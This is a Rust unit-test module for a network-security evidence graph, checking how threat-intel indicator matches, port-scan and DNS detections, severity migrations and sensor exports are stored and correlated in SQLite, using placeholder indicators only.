        let (count, hits2): (i64, i64) = g.conn.query_row(
            "SELECT COUNT(*), MAX(hits) FROM iocs", [], |r| Ok((r.get(0)?, r.get(1)?)),
        ).unwrap();
        assert_eq!(count, 1, "one iocs row per distinct indicator value");
        assert_eq!(hits2, 2, "hits accumulates across sightings");
    }

    #[test]
    fn ingest_ioc_match_enriches_a_pre_existing_detection_and_incident_naming_the_same_indicator() {
        let g = EvidenceGraph::open_memory().unwrap();
        // a NAPSE port-scan already fired from this exact attacker IP, BEFORE HYDRA ever ran.
        let scan = detection_line(100.0, 1_000_003, "185.220.101.1", "192.168.1.10", 22);
        let scan_det_id = g.ingest_detection(&scan).unwrap().unwrap();
        g.correlate_all(0.0).unwrap();
        let inc_id: String = g.conn.query_row(
            "SELECT id FROM incidents WHERE device_ip=?", params!["185.220.101.1"], |r| r.get(0),
        ).unwrap();

        // HYDRA later confirms the SAME IP is a known-bad indicator (an inbound match: attacker ==
        // src_ip, our device == dst_ip).
        let ioc = ioc_match_line(200.0, 4_000_000_002, "185.220.101.1", "ip", "known-scanner", "185.220.101.1", "192.168.1.10", 22, 0.8);
        let ioc_det_id = g.ingest_ioc_match(&ioc).unwrap().unwrap();
        assert_ne!(ioc_det_id, scan_det_id, "HYDRA's own detection is a distinct node");

        let ioc_id = sid("ioc", "185.220.101.1");
        let edges: Vec<(String, String, String)> = {
            let mut stmt = g.conn.prepare("SELECT src_id, edge_type, dst_id FROM edges").unwrap();
            stmt.query_map([], |r| Ok((r.get(0)?, r.get(1)?, r.get(2)?))).unwrap().filter_map(|r| r.ok()).collect()
        };
        // the PRE-EXISTING NAPSE detection AND its incident both got enriched, not just HYDRA's own.
        assert!(edges.contains(&(scan_det_id, "enriched_by".to_string(), ioc_id.clone())), "pre-existing detection enriched");
        assert!(edges.contains(&(inc_id, "enriched_by".to_string(), ioc_id)), "pre-existing incident enriched");
    }

    #[test]
    fn ingest_ioc_match_domain_type_never_treats_the_domain_itself_as_a_seen_on_device() {
        let g = EvidenceGraph::open_memory().unwrap();
        // a domain-type indicator match: the domain rides in `dst_ip` (the SAME convention
        // `ingest_dns_verdict` already uses), our device is `src_ip`.
        let line = ioc_match_line(100.0, 4_000_000_003, "evil-c2.example", "domain", "Cobalt Strike", "10.66.0.5", "evil-c2.example", 443, 0.85);
        g.ingest_ioc_match(&line).unwrap().unwrap();
        let ioc_id = sid("ioc", "evil-c2.example");
        let seen_on: Vec<String> = {
            let mut stmt = g.conn.prepare("SELECT dst_id FROM edges WHERE src_id=? AND edge_type='ioc_seen_on'").unwrap();
            stmt.query_map(params![ioc_id], |r| r.get(0)).unwrap().filter_map(|r| r.ok()).collect()
        };
        assert_eq!(seen_on, vec![sid("dev", "10.66.0.5")], "only the real LAN device, never a device node for the domain itself");
    }

    #[test]
    fn ioc_flow_candidates_returns_flows_with_application_pivot_and_advances_watermark() {
        let g = EvidenceGraph::open_memory().unwrap();
        g.ingest_flow(&flow_line(100.0, "10.66.0.5", "104.20.20.20", 443)).unwrap();
        // a second flow carrying a TLS SNI (the Application pivot HYDRA's domain-matching needs).
        g.ingest_flow(r#"{"type":"conn","ts":200.0,"src_ip":"10.66.0.6","src_port":51000,"dst_ip":"104.20.20.21","dst_port":443,"proto":"tcp","conn_state":"S0","orig_bytes":0,"resp_bytes":0,"tls_sni":"evil-c2.example"}"#).unwrap();

        let v: serde_json::Value = serde_json::from_str(&g.ioc_flow_candidates(100).unwrap()).unwrap();
        let rows = v.as_array().unwrap();
        assert_eq!(rows.len(), 2);
        let with_sni = rows.iter().find(|r| r["sni"] == "evil-c2.example").expect("sni pivot present");
        assert_eq!(with_sni["dst_ip"], "104.20.20.21");
        let without_sni = rows.iter().find(|r| r["dst_ip"] == "104.20.20.20").unwrap();
        assert_eq!(without_sni["sni"], "", "a flow with no application pivot yields an empty sni, never fabricated");

        // watermark advanced: a re-run with NO new flows sees nothing.
        let v2: serde_json::Value = serde_json::from_str(&g.ioc_flow_candidates(100).unwrap()).unwrap();
        assert_eq!(v2.as_array().unwrap().len(), 0, "watermark means a rerun with no new flows is a no-op");

        // a NEW flow after the watermark IS seen on the next call.
        g.ingest_flow(&flow_line(300.0, "10.66.0.7", "1.2.3.4", 80)).unwrap();
        let v3: serde_json::Value = serde_json::from_str(&g.ioc_flow_candidates(100).unwrap()).unwrap();
        assert_eq!(v3.as_array().unwrap().len(), 1);
    }

    #[test]
    fn list_intel_summarizes_iocs_by_type_and_serves_recent_threat_intel_detections() {
        let g = EvidenceGraph::open_memory().unwrap();
        g.ingest_ioc_match(&ioc_match_line(100.0, 4_000_000_004, "1.2.3.4", "ip", "Test", "10.66.0.5", "1.2.3.4", 443, 0.9)).unwrap();
        g.ingest_ioc_match(&ioc_match_line(200.0, 4_000_000_005, "bad.example", "domain", "Test", "10.66.0.6", "bad.example", 443, 0.7)).unwrap();

        let v: serde_json::Value = serde_json::from_str(&g.list_intel(50).unwrap()).unwrap();
        assert_eq!(v["summary"]["total_indicators"], 2);
        assert_eq!(v["summary"]["ip"], 1);
        assert_eq!(v["summary"]["domain"], 1);
        assert_eq!(v["iocs"].as_array().unwrap().len(), 2);
        assert_eq!(v["recent_matches"].as_array().unwrap().len(), 2);
        assert_eq!(v["cve_lens"], "/api/exploitability");
    }

    #[test]
    fn incident_priority_comes_from_worst_detection_on_canonical_scale() {
        let g = EvidenceGraph::open_memory().unwrap();
        let det = |sev: i64, rule: i64, ip: &str| format!(
            r#"{{"ts":10.0,"rule_id":{rule},"rule_msg":"t","category":"c","severity":{sev},"mitre":"","src_ip":"{ip}","dst_ip":"10.0.0.1","dst_port":22,"confidence":0.8}}"#);
        // one CRITICAL + one INFO on the same device -> the incident is High, score 1.0
        g.ingest_detection(&det(1, 1, "198.51.100.1")).unwrap();
        g.ingest_detection(&det(5, 2, "198.51.100.1")).unwrap();
        // only LOW detections -> Medium, score 0.4 (never > 1.0)
        g.ingest_detection(&det(4, 3, "198.51.100.2")).unwrap();
        let a = g.correlate_incident("198.51.100.1", "a").unwrap();
        let b = g.correlate_incident("198.51.100.2", "b").unwrap();
        let row = |id: &str| -> (String, f64) {
            g.conn.query_row("SELECT priority, threat_score FROM incidents WHERE id=?", params![id],
                |r| Ok((r.get(0)?, r.get(1)?))).unwrap()
        };
        assert_eq!(row(&a), ("High".to_string(), 1.0));
        let (pb, sb) = row(&b);
        assert_eq!(pb, "Medium");
        assert!((sb - 0.4).abs() < 1e-9, "score {sb}");
    }

    #[test]
    fn dns_verdict_writes_canonical_severity() {
        let g = EvidenceGraph::open_memory().unwrap();
        let sev = |verdict: &str, domain: &str| -> i64 {
            let id = g.ingest_dns_verdict(&format!(
                r#"{{"domain":"{domain}","verdict":"{verdict}","score":0.9,"src_ip":"198.51.100.3"}}"#))
                .unwrap().expect("ingested");
            g.conn.query_row("SELECT severity FROM detections WHERE id=?", params![id], |r| r.get(0)).unwrap()
        };
        // suspicious must NOT render CRITICAL (it used to be stored as 1 = CRITICAL)
        assert_eq!(sev("suspicious", "a.example"), SEV_MEDIUM);
        assert_eq!(sev("malicious", "b.example"), SEV_HIGH);
    }

    #[test]
    fn severity_value_migration_remaps_old_scale_rows_once() {
        let path = std::env::temp_dir().join(format!("hp-sevmig-{}.db", std::process::id()));
        std::fs::remove_file(&path).ok();
        {
            let g = EvidenceGraph::open(&path).unwrap();
            // rows as the OLD producers wrote them (higher = worse), DB marked pre-migration
            g.conn.execute_batch(
                "INSERT INTO detections VALUES ('d1',1.0,0,'m','dns_dga',1,'','10.0.0.9','',53,0.5);
                 INSERT INTO detections VALUES ('d2',1.0,0,'m','dns_dga',2,'','10.0.0.9','',53,0.5);
                 INSERT INTO detections VALUES ('r1',1.0,0,'m','aegis_reflex',3,'','10.0.0.9','',0,0.5);
                 INSERT INTO detections VALUES ('r2',1.0,0,'m','aegis_reflex',1,'','10.0.0.9','',0,0.5);
                 INSERT INTO detections VALUES ('g1',1.0,0,'m','aegis_guard',2,'','','',0,1.0);
                 INSERT INTO detections VALUES ('n1',1.0,1,'m','port_scan',1,'','10.0.0.9','',22,0.5);
                 PRAGMA user_version = 0;").unwrap();
        }
        let sev = |g: &EvidenceGraph, id: &str| -> i64 {
            g.conn.query_row("SELECT severity FROM detections WHERE id=?", params![id], |r| r.get(0)).unwrap()
        };
        let g = EvidenceGraph::open(&path).unwrap();
        assert_eq!(sev(&g, "d1"), SEV_MEDIUM); // dns suspicious
        assert_eq!(sev(&g, "d2"), SEV_HIGH); // dns malicious
        assert_eq!(sev(&g, "r1"), SEV_HIGH); // reflex DISCONNECT
        assert_eq!(sev(&g, "r2"), SEV_LOW); // reflex JITTER
        assert_eq!(sev(&g, "g1"), SEV_MEDIUM); // guard Deny
        assert_eq!(sev(&g, "n1"), 1); // napse CRITICAL untouched
        drop(g);
        // second open is a no-op (version-gated): values must not be remapped twice
        let g = EvidenceGraph::open(&path).unwrap();
        assert_eq!(sev(&g, "d1"), SEV_MEDIUM);
        assert_eq!(sev(&g, "r2"), SEV_LOW);
        drop(g);
        std::fs::remove_file(&path).ok();
    }

    /// The exact line shapes `kernel/responder-sim` (export_rx::frame_to_jsonl) writes.
    fn heqk_det_line(ev_seq: u64, rule: u16, class: &str, verdict: &str, src_ip: &str) -> String {
        serde_json::json!({
            "type": "heqk_detection", "ts": 1_700_000_000.5, "device_fp": "ab".repeat(32),
            "tenant": 0x5445_4E41u64, "boots": 4, "ev_seq": ev_seq, "rule_id": rule, "sev_points": 5,
            "verdict": verdict, "class": class, "src_ip": src_ip, "src_mac_hash": "",
        }).to_string()
    }

    #[test]
    fn heqk_export_detection_lands_with_provenance_and_canonical_severity() {
        let g = EvidenceGraph::open_memory().unwrap();
        let id = g.ingest_heqk_export(&heqk_det_line(7, 1, "framedrop", "DROP", "192.168.1.50")).unwrap().unwrap();
        let (rule_id, sev, cat, mitre, src): (i64, i64, String, String, String) = g.conn.query_row(
            "SELECT rule_id, severity, category, mitre, src_ip FROM detections WHERE id=?", params![id],
            |r| Ok((r.get(0)?, r.get(1)?, r.get(2)?, r.get(3)?, r.get(4)?))).unwrap();
        assert_eq!(rule_id, HEQK_RULE_BAND + 1);
        assert_eq!(sev, SEV_HIGH, "C2-port signature = HIGH on the canonical 1=CRITICAL scale");
        assert_eq!((cat.as_str(), mitre.as_str(), src.as_str()), ("signature", "T1571", "192.168.1.50"));
        let (fp, tenant, boots, seq, class): (String, String, i64, i64, String) = g.conn.query_row(
            "SELECT sensor_fp, tenant, boots, ev_seq, class FROM heqk_detection_meta WHERE det_id=?", params![id],
            |r| Ok((r.get(0)?, r.get(1)?, r.get(2)?, r.get(3)?, r.get(4)?))).unwrap();
        assert_eq!((fp, tenant.as_str(), boots, seq, class.as_str()), ("ab".repeat(32), "0x54454e41", 4, 7, "framedrop"));
        let edges: i64 = g.conn.query_row(
            "SELECT count(*) FROM edges WHERE src_id=? AND edge_type='detects_on_device' AND dst_id=?",
            params![id, sid("dev", "192.168.1.50")], |r| r.get(0)).unwrap();
        assert_eq!(edges, 1, "the detection links to its subject device in the evidence graph");
        // Re-ingesting the same (sensor, boot, seq) is idempotent.
        g.ingest_heqk_export(&heqk_det_line(7, 1, "framedrop", "DROP", "192.168.1.50")).unwrap();
        let n: i64 = g.conn.query_row("SELECT count(*) FROM detections", [], |r| r.get(0)).unwrap();
        assert_eq!(n, 1);
    }

    #[test]
    fn heqk_export_loss_accounting_upserts_per_sensor_boot() {
        let g = EvidenceGraph::open_memory().unwrap();
        let frame = |gap: u64, lost: u64| serde_json::json!({
            "type": "heqk_frame", "ts": 1_700_000_001.0, "device_fp": "cd".repeat(32), "tenant": 7u64,
            "boots": 2, "frame_seq": 0, "events": 0, "qsecbit": 812, "device_overruns": 3,
            "device_lost": lost, "gap_events": gap, "late_events": 0,
        }).to_string();
        g.ingest_heqk_export(&frame(0, 0)).unwrap().unwrap();
        g.ingest_heqk_export(&frame(5, 2)).unwrap().unwrap();
        let (frames, gap, lost, overruns): (i64, i64, i64, i64) = g.conn.query_row(
            "SELECT frames, gap_events, device_lost, device_overruns FROM heqk_sensor_loss WHERE boots=2", [],
            |r| Ok((r.get(0)?, r.get(1)?, r.get(2)?, r.get(3)?))).unwrap();
        assert_eq!((frames, gap, lost, overruns), (2, 5, 2, 3));
    }

    #[test]
    fn heqk_export_rejects_lines_without_a_valid_sensor_id_and_prunes_orphans() {
        let g = EvidenceGraph::open_memory().unwrap();
        assert!(g.ingest_heqk_export(r#"{"type":"heqk_detection","device_fp":"nothex","rule_id":1}"#).unwrap().is_none());
        assert!(g.ingest_heqk_export("garbage").unwrap().is_none());
        // An unknown rule id still ingests (never silently dropped).
        let id = g.ingest_heqk_export(&heqk_det_line(1, 999, "observe", "PASS", "")).unwrap().unwrap();
        let msg: String = g.conn.query_row("SELECT rule_msg FROM detections WHERE id=?", params![id], |r| r.get(0)).unwrap();
        assert!(msg.contains("heqk rule 999"));
        // Retention: the detection (old ts) is pruned and its provenance row follows it.
        g.prune(1.0, None).unwrap();
        let meta: i64 = g.conn.query_row("SELECT count(*) FROM heqk_detection_meta", [], |r| r.get(0)).unwrap();
        assert_eq!(meta, 0);
    }
}
